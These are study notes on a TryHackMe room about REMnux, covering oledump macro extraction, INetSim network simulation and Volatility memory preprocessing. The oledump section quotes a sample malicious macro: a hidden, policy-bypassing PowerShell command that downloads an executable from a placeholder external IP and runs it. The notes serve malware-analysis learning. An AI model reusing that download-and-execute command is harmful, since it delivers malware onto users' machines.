https://tryhackme.com/r/room/remnuxgettingstarted
https://remnux.org/ (refer to the download section)

Username: `remnux` Password: `malware`

- Specialised Linux distro for reverse-engineering and analysing malicious software

- Includes tools like:
	- Volatility
	- YARA
	- Wireshark
	- oledump
	- INetSim

File Analysis
- oledump.py
	- A python tool that analyses OLE2 files
		- Object Linking and Embedding
			- These files can hold multiple data types
				- Documents, spreadsheets, presentations - within a single file
	- oledump.py is useful for extracting and examining the contents of OLE2 files
	- Can pick up VBA scripts that could be embedded inside the file
		- `oledump.py <filename.xlsm>`
		- If so, it will assign the file (or location within the file) with an `A`
			- Though this can different
		- The `A <+number>` are called **Data Streams**
	- Data Streams beginning with a capital `M` outlines there is a Macro
	- Say for example if the macro data stream is fourth on the list, we can run for example:
		- `oledump.py <filename.xlsm> -s 4`
			- Where we are selecting the fourth item
		- This will get us a hex dump of that data stream
		- We can add the `--vbadecompress` parameter to our command
			- `oledump.py <filename.xlsm> -s 4 --vbadecompress`
		- Say for example oledump.py returns this:
			```powershell
			"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://<external-ip-address>/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
			```
		- This macro is essentially running PowerShell without being visible to the end-user, allowing any script to be able to run without without restriction, pulling a file from the an external IP address, and saving it to a variable called `$TempFile` - it then runs that file.

Fake Network to Aid Analysis
- During dynamic analysis - it is essential to observe the behaviour of potentially malicious software - especially its network activity. 
- We could:
	- Create a whole infrastructure...
	- A virtual environment with different core machines
	- And more
- REMnux VM has what is called **INetSim: Internet Services Simulation Suite**

- INetSim
	- `/etc/inetsim/inetsim.conf`
		- Make sure DNS settings here are as they should be 
		- In the THM exercise, the `dns_default_ip` was changed from `0.0.0.0` to the REMnux box's IP
	- `sudo inetsim`
		- Ensuring that the simulation was running
	- Will need to muck around with this tool further
	- Another machine on the same virtual network will be able to connect to the INetSim service on port 443 on the REMnux machine
	- Captured connections are saved in `/var/log/inetsim/report/`

Memory Investigation: Evidence Preprocessing
- Common investigate practice in Digital Forensics - the preprocessing of evidence
- Involves running tools and saving the results in text or JSON format (JSON could be better..)
- Tools like **Volatility** when dealing with memory images as evidence

- Volatility (already included in REMnux)
- https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html
	- `vol3
	- `vol3 -f <memory-image-file.mem>`
	- Volatility commands are executed to identify and extract specific artefacts from memory images
	- The resulting output can be saved for further examination
	- Scripts can be run which involves the tool's different parameters to preprocess the acquired evidence faster
	- **Preprocessing with Volatility** (these are known as **plugins**)
		- PsTree
			- `vol3 -f <memory-image-file.mem> windows.pstree.PsTree`
			- Lists processes in a tree based on their parent process ID
		- PsList
			- `vol3 -f <memory-image-file.mem> windows.pslist.PsList`
			- Lists all currently active processes in the machine
		- CmdLine
			- `vol3 -f <memory-image-file.mem> windows.cmdline.CmdLine`
			- Lists process command line arguments
		- FileScan
			- `vol3 -f <memory-image-file.mem> windows.filescan.FileScan`
			- Scans for file objects in a particular Windows memory image
		- DllList
			- `vol3 -f <memory-image-file.mem> windows.dlllist.DllList`
			- Lists the loaded modules in a particular Windows memory image
		- PsScan
			- `vol3 -f <memory-image-file.mem> windows.psscan.PsScan`
			- Lists processes present in a particular Windows memory image
		- Malfind
			- `vol3 -f <memory-image-file.mem> windows.malfind.Malfind`
			- Lists process memory ranges that potentially contain injected code
		- You can save these results, combined into one text file, via a bash loop
		`for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f <memory-image-file.mem> $plugin > <file-name>.$plugin.txt; done`
		- You will get individual .txt files for each of the different Preprocessing jobs that were listed into the `$plugin` variable (as above)
	- **Preprocessing with Strings**
		- Extract the ASCII, 16-bit little-endian, and 16-bit big-endian strings
		- `strings <memory-image-file.mem> > <new-file-name>.strings.ascii.txt`
		- `strings -e l <memory-image-file.mem> > <new-file-name>.strings.unicode_little_endian.txt`
		- `strings -e b <memory-image-file.mem> > <new-file-name>.strings.unicode_big_endian.txt`
		- 